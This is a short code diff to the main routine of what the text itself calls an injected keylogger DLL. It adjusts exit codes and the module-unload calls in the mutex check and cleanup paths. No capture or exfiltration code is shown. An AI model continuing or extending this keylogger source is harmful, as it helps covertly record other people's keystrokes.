@@ -341,6 +341,8 @@ int main(HMODULE hModule)
     if (hMutex == NULL)
     {
         LOG_ERROR("Process %d already has keylogger injected", GetCurrentProcessId());
+        free_module_exit_thread(hModule, 1);
+        LOG_CRITICAL("This should never execute!");
         return 1;
     }
     context ctx{};
@@ -442,7 +444,7 @@ int main(HMODULE hModule)
     UnregisterClass(class_name, window_class.hInstance);
     ReleaseMutex(hMutex);
     CloseHandle(hMutex);
-    free_module_exit_thread(hModule);
+    free_module_exit_thread(hModule, 0);
     LOG_CRITICAL("This should never execute!");
     return 0;
 }
